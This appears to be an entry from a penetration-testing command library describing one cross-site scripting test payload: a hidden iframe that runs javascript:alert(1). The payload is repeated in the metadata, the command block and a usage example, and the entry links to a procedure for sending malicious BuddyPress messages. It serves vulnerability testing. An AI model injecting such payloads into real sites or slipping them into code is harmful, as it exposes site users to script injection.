---
data: '<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>'
tags:
  - xss
  - test
type: command
executor: html
platforms:
  - Web
id: 5691c6e1-8eab-4dd4-b5e7-138d114c8d08
created_at: '2025-12-14T00:11:16.590Z'
updated_at: '2025-12-14T00:11:16.590Z'
verified: false
validated: true
submitted: true
---
# Simple XSS Iframe Alert

## Command

```html
<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
```

## Description

Basic XSS payload to test vulnerability by displaying an alert box when executed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `src` | Executes JavaScript alert(1) | Yes |

## Examples

### Basic Usage

```html
Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
```

## Expected Output

Alert box with '1'

## Related

- [[procedures/Send-Malicious-Private-Message-via-BuddyPress]]
